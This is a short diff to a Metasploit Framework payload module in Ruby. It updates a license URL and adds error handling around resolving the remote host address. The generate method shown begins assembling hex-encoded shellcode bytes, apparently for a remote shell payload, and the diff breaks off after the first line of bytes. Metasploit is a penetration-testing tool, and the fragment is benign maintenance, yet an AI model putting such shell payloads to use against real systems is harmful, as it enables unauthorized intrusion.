@@ -5,8 +5,8 @@
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -36,7 +36,12 @@ module Metasploit3
 
 	def generate
 		port    = (datastore['RPORT'] || '0').to_i
-		host    = Rex::Socket.resolv_nbo_i(datastore['RHOST'] || '127.0.0.1')
+		host    = nil
+		begin
+			host    = Rex::Socket.resolv_nbo_i(datastore['RHOST'] || '127.0.0.1')
+		rescue SocketError
+			host    = Rex::Socket.resolv_nbo_i('127.0.0.1')
+		end
 
 		payload =
 			"\x9c\x2b\xa0\x07\x94\x1a\xc0\x0b\x92\x10\x20\x01\x90\x10\x20\x02" +
